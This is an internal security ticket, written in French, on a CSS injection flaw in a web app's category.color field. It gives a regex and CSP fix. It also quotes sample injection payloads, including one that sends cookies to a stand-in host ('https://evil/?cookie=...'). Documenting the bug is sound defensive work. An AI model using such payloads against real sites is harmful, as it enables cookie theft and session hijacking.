---
id: 56
title: "SEC / FIX / CSS injection via category.color"
status: done
who: "Claude"
due_date: 
classified_at: 2026-05-24T14:29:18
classified_by: "key:038c1b37-7879-43bc-82aa-b83f61f6da8a:user:049c2571-0e1a-4e95-b0ad-3943f0f80a7e"
section: backend/auth
section_title: "Authentication & permissions"
---

# #56 — SEC / FIX / CSS injection via category.color

**Sévérité: MEDIUM**

`category.color` est injectée brute dans des attributs `style="background:{{ c.color }}"` (cf. `templates/index.html`). Pas de validation côté serveur — seule la longueur est limitée à 50 chars (`CategoryCreate.color`). Permet d'injecter du CSS arbitraire (`red;background:url('javascript:...')`). Impact: limité aux capacités CSS (pas d'exécution JS direct dans les navigateurs modernes), mais permet l'exfil via `background-image: url('https://evil/?cookie=...')` si la CSP le permet.

**Reproduction:** `python pentest/auth_xss_stored.py`

**Remédiation:**
1. Validateur Pydantic strict sur `color`: regex `^#[0-9a-fA-F]{6}$` ou liste blanche de `var(--xxx)`.
2. La CSP (#41) avec `style-src 'self'` (sans 'unsafe-inline') empêcherait l'attaque mais casserait l'app actuelle.
---

[← retour à backend/auth](index.md) · [voir log](../../log.md)
